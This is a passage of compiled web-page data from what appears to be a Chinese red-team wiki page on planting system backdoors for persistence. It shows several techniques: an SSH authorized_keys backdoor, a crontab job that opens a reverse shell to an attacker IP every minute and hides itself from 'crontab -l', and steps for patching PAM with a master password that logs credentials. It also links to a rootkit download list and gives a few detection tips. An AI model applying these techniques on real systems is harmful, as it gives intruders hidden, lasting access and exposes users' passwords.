\"\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"chmod\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token number\"\n  }), \"600\"), \" ~/.ssh/authorized_keys\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"chmod\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token number\"\n  }), \"700\"), \" ~/.ssh\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token builtin class-name\"\n  }), \"echo\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token string\"\n  }), \"\\\"id_rsa.pub\\u7684\\u5185\\u5BB9\\\"\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \">\"), \" ~/.ssh/authorized_keys\\n\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u6CA1\\u6709\\u8FD9\\u4E2A\\u6587\\u4EF6\\u7684\\u8BDD\\uFF0C\\u5C31\\u81EA\\u5DF1\\u521B\\u5EFA\\u4E00\\u4E2A\"), \"\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token builtin class-name\"\n  }), \"cd\"), \" ~/\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"mkdir\"), \" .ssh\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token builtin class-name\"\n  }), \"cd\"), \" .ssh\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"touch\"), \" authorized_keys\"), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"h2\", null, \"Crontab\\u5B9A\\u65F6\\u53CD\\u5F39shell\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"crontab定时反弹shell\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#crontab%E5%AE%9A%E6%97%B6%E5%8F%8D%E5%BC%B9shell\",\n    \"aria-label\": \"crontab定时反弹shell permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token punctuation\"\n  }), \"(\"), \"crontab -l\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token punctuation\"\n  }), \";\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token builtin class-name\"\n  }), \"printf\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token string\"\n  }), \"\\\"*/1 * * * * exec 9<> /dev/tcp/\\u653B\\u51FB\\u8005IP/8888;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"token entity\",\n    \"title\": \"\\\\r\"\n  }), \"\\\\r\"), \"no crontab for \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"token variable\"\n  }), mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"token variable\"\n  }), \"`\"), mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"token function\"\n  }), \"whoami\"), mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"token variable\"\n  }), \"`\")), \"%100c\", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"token entity\",\n    \"title\": \"\\\\n\"\n  }), \"\\\\n\"), \"\\\"\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token punctuation\"\n  }), \")\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \"|\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"crontab\"), \" -\\n\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u6BCF\\u5206\\u949F\\u6267\\u884C\\u4E00\\u6B21\\uFF0C\\u5E76\\u4E14crontab -l\\u770B\\u4E0D\\u51FA\\u6765\"), \"\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u8FD9\\u79CD\\u8981\\u7528crontab -e \\u8FDB\\u53BB\\u67E5\\u770B\\u5E76\\u7F16\\u8F91\\u624D\\u80FD\\u770B\\u5230\")), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"h2\", null, \"PAM\\u540E\\u95E8\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"pam后门\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#pam%E5%90%8E%E9%97%A8\",\n    \"aria-label\": \"pam后门 permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"blockquote\", null, mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, \" \", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"PAM \\uFF08Pluggable Authentication Modules \\uFF09\"), \"\\u662F\\u7531Sun\\u63D0\\u51FA\\u7684\\u4E00\\u79CD\\u8BA4\\u8BC1\\u673A\\u5236\\u3002\"), mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, \"\\u5B83\\u901A\\u8FC7\\u63D0\\u4F9B\\u4E00\\u4E9B\\u52A8\\u6001\\u94FE\\u63A5\\u5E93\\u548C\\u4E00\\u5957\\u7EDF\\u4E00\\u7684API\\uFF0C\\u5C06\\u7CFB\\u7EDF\\u63D0\\u4F9B\\u7684\\u670D\\u52A1\\u548C\\u8BE5\\u670D\\u52A1\\u7684\\u8BA4\\u8BC1\\u65B9\\u5F0F\\u5206\\u5F00\"), mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, \"\\u4F7F\\u5F97\\u7CFB\\u7EDF\\u7BA1\\u7406\\u5458\\u53EF\\u4EE5\\u7075\\u6D3B\\u5730\\u6839\\u636E\\u9700\\u8981\\u7ED9\\u4E0D\\u540C\\u7684\\u670D\\u52A1\\u914D\\u7F6E\\u4E0D\\u540C\\u7684\\u8BA4\\u8BC1\\u65B9\\u5F0F\\uFF0C\\u800C\\u65E0\\u9700\\u66F4\\u6539\\u670D\\u52A1\\u7A0B\\u5E8F\"), mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, \"\\u540C\\u65F6\\u4E5F\\u4FBF\\u4E8E\\u5411\\u7CFB\\u7EDF\\u4E2D\\u6DFB\\u52A0\\u65B0\\u7684\\u8BA4\\u8BC1\\u624B\\u6BB5\")), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u6B65\\u9AA4\\uFF1A\")), mdx(\"p\", null, \"1\\u3001\\u83B7\\u53D6\\u76EE\\u6807\\u7CFB\\u7EDF\\u6240\\u4F7F\\u7528\\u7684PAM\\u7248\\u672C\\uFF0C\\u4E0B\\u8F7D\\u5BF9\\u5E94\\u7248\\u672C\\u7684pam\\u7248\\u672C\"), mdx(\"p\", null, \"2\\u3001\\u89E3\\u538B\\u7F29\\uFF0C\\u4FEE\\u6539pam_unix_auth.c\\u6587\\u4EF6\\uFF0C\\u6DFB\\u52A0\\u4E07\\u80FD\\u5BC6\\u7801\"), mdx(\"p\", null, \"3\\u3001\\u7F16\\u8BD1\\u5B89\\u88C5PAM\"), mdx(\"p\", null, \"4\\u3001\\u7F16\\u8BD1\\u5B8C\\u540E\\u7684\\u6587\\u4EF6\\u5728\\uFF1Amodules/pam_unix/.libs/pam_unix.so\\uFF0C\\u590D\\u5236\\u5230/lib64/security\\u4E2D\\u8FDB\\u884C\\u66FF\\u6362\"), mdx(\"p\", null, \"\\u200B\\t\\t\\u5373\\u53EF\\u4F7F\\u7528\\u4E07\\u80FD\\u5BC6\\u7801\\u767B\\u9646\\uFF0C\\u5E76\\u5C06\\u7528\\u6237\\u540D\\u5BC6\\u7801\\u8BB0\\u5F55\\u5230\\u6587\\u4EF6\\u4E2D\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u6392\\u67E5PAM\\u540E\\u95E8\\u6280\\u5DE7\\uFF1A\")), mdx(\"p\", null, \"1\\u3001\\u901A\\u8FC7Strace\\u8DDF\\u8E2Assh\"), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"ps\"), \" axu \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \"|\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"grep\"), \" sshd\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"strace\"), \" -o aa -ff -p PID\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"grep\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"open\"), \" aa* \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \"|\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"grep\"), \" -v -e No -e null -e denied\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \"|\"), \" \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"grep\"), \" WR\"), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"p\", null, \"2\\u3001\\u68C0\\u67E5pam_unix.so\\u7684\\u4FEE\\u6539\\u65F6\\u95F4\"), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"stat\"), \" /lib/security/pam_unix.so      \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#32\\u4F4D\"), \"\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"stat\"), \" /lib64/security/pam_unix.so    \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#64\\u4F4D\")), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"h2\", null, \"Rootkit\\u5DE5\\u5177\\u5305\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"rootkit工具包\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#rootkit%E5%B7%A5%E5%85%B7%E5%8C%85\",\n    \"aria-label\": \"rootkit工具包 permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"blockquote\", null, mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, \"rootkit\\u662F\\u4E00\\u79CD\\u7279\\u6B8A\\u7684\\u6076\\u610F\\u8F6F\\u4EF6\\u3002\\u4E09\\u8981\\u7D20\\u662F\\uFF1A\", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u9690\\u85CF\\u3001\\u64CD\\u7EB5\\u3001\\u6536\\u96C6\\u6570\\u636E\"), \"\\u3002\"), mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, \"\\u529F\\u80FD\\u662F\\u5728\\u5B89\\u88C5\\u76EE\\u6807\\u4E0A\\u9690\\u85CF\\u81EA\\u8EAB\\u53CA\\u6307\\u5B9A\\u7684\\u6587\\u4EF6\\u3001\\u8FDB\\u7A0B\\u548C\\u7F51\\u7EDC\\u94FE\\u63A5\\u7B49\\u4FE1\\u606F\"), mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, \"\\u591A\\u89C1\\u7684rootkit\\u4E00\\u822C\\u90FD\\u662F\\u6728\\u9A6C\\u3001\\u540E\\u95E8\\u548C\\u5176\\u5B83\\u6076\\u610F\\u7A0B\\u5E8F\\u7ED3\\u5408\\u4F7F\\u7528\"), mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Rootkit\\u901A\\u8FC7\\u52A0\\u8F7D\\u7279\\u6B8A\\u7684\\u9A71\\u52A8\\uFF0C\\u4FEE\\u6539\\u7CFB\\u7EDF\\u5185\\u6838\\uFF0C\\u8FDB\\u800C\\u8FBE\\u5230\\u9690\\u85CF\\u4FE1\\u606F\\u7684\\u76EE\\u7684\")), mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, \"Rootkit\\u662F\\u653B\\u51FB\\u8005\\u7528\\u6765\\u9690\\u85CF\\u81EA\\u5DF1\\u7684\\u8E2A\\u8FF9\\u548C\\u4FDD\\u7559root\\u8BBF\\u95EE\\u6743\\u9650\\u7684\\u5DE5\\u5177\")), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Rootkit\\u7C7B\\u578B\")), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), \"\\u56FA\\u4EF6Rootkit\\n\\u865A\\u62DF\\u5316Rootkit\\n\\u5185\\u6838\\u7EA7Rootkit\\n\\u5E93\\u7EA7Rootkit\\n\\u5E94\\u7528\\u7EA7Rootkit\"), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Rootkit\\u5DE5\\u5177\\u5305\\u5217\\u8868\"), \"\\uFF1A\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/d30sa1/RootKits-List-Download\"\n  }), \"https://github.com/d30sa1/RootKits-List-Download\"), \"  \\uFF08\\u6CE8\\u610F\\u4E0E\", mdx(\"code\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"language-text\"\n  }), \"Centos\"), \"\\u7248\\u672C\\u9002\\u914D\\uFF09\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u68C0\\u6D4B\\u4E0E\\u9632\\u62A4\\uFF1A\")), mdx(\"p\", null, \"rkhunter\\uFF1A\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"http://rkhunter.sourceforge.net/\"\n  }), \"http://rkhunter.sourceforge.net/\"), \" \"), mdx(\"p\", null, \"chkrootkit\\uFF1A\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"http://www.chkrootkit.org/download/\"\n  }), \"http://www.chkrootkit.org/download/\"), \" \"), mdx(\"p\", null, \"\\u5B9A\\u671F\\u68C0\\u67E5md5\\uFF0C\\u5BF9\\u4E8E\\u627E\\u51FA\\u7684 Rootkit\\uFF0C\\u6700\\u597D\\u7684\\u5E94\\u5BF9\\u65B9\\u6CD5\\u662F\\u64E6\\u9664\\u5E76\\u91CD\\u65B0\\u5B89\\u88C5\\u7CFB\\u7EDF\"), mdx(\"style\", null, \".anchorLink.before{position:absolute;top:0;left:0;transform:translateX(-100%);padding-right:4px}.anchorLink.after{display:inline-block;padding-left:4px}h1 .anchorLink svg,h2 .anchorLink svg,h3 .anchorLink svg,h4 .anchorLink svg,h5 .anchorLink svg,h6 .anchorLink svg{visibility:hidden}h1 .anchorLink:focus svg,h1:hover .anchorLink svg,h2 .anchorLink:focus svg,h2:hover .anchorLink svg,h3 .anchorLink:focus svg,h3:hover .anchorLink svg,h4 .anchorLink:focus svg,h4:hover .anchorLink svg,h5 .anchorLink:focus svg,h5:hover .anchorLink svg,h6 .anchorLink:focus svg,h6:hover .anchorLink svg{visibility:visible}a.anchor{display:inline-block;position:relative;top:-159px;visibility:hidden}@media only screen and (max-width:1279.95px){a.anchor{top:-101px}}\"));\n}\n;\nMDXContent.isMDXComponent = true;","headings":[{"value":"Windows"},{"value":"Schtasks后门"},{"value":"wmi后门"},{"value":"DLL劫持后门"},{"value":"映像劫持shift后门"},{"value":"Linux"},{"value":"增加超级用户账号"},{"value":"SSH公钥无密码登录"},{"value":"Crontab定时反弹shell"},{"value":"PAM后门"},{"value":"Rootkit工具包"}],"frontmatter":{"author":null,"tags":null,"title":"【红队】权限维持之--系统后门","noMeta":null,"noComment":null,"description":null},"toc":{"items":[{"url":"#windows","title":"Windows","items":[{"url":"#schtasks后门","title":"Schtasks后门"},{"url":"#wmi后门","title":"wmi后门"},{"url":"#dll劫持后门","title":"DLL劫持后门"},{"url":"#映像劫持shift后门","title":"映像劫持shift后门"}]},{"url":"#linux","title":"Linux","items":[{"url":"#增加超级用户账号","title":"增加超级用户账号"},{"url":"#ssh公钥无密码登录","title":"SSH公钥无密码登录"},{"url":"#crontab定时反弹shell","title":"Crontab定时反弹shell"},{"url":"#pam后门","title":"PAM后门"},{"url":"#rootkit工具包","title":"Rootkit工具包"}]}]},"parent":{"__typename":"File","relativePath":"hw/os-shell.md","modifiedTime":"2020/08/14"}}},"pageContext":{"id":"9f30d73d-bc54-5a14-80cc-c45610585a4e","previous":{"node":{"fields":{"slug":"/hw/to-root/"},"id":"02cf7ca0-807c-5b1f-ae55-5ffd69d7ec77","frontmatter":{"tags":null,"title":"【红队】权限维持之--权限提升"},"fileAbsolutePath":"/home/runner/work/WgpsecWiki/WgpsecWiki/docs/hw/to-root.md"}},"next":{"node":{"fields":{"slug":"/hw/net-proxy/"},"id":"6428d2f9-7050-5c8f-a2e4-c2ed6fa7b6d3","frontmatter":{"tags":null,"title":"【红队】构建通道漫游内网"},"fileAbsolutePath":"/home/runner/work/WgpsecWiki/WgpsecWiki/docs/hw/net-proxy.md"}}}},"staticQueryHashes":["2462162885"]}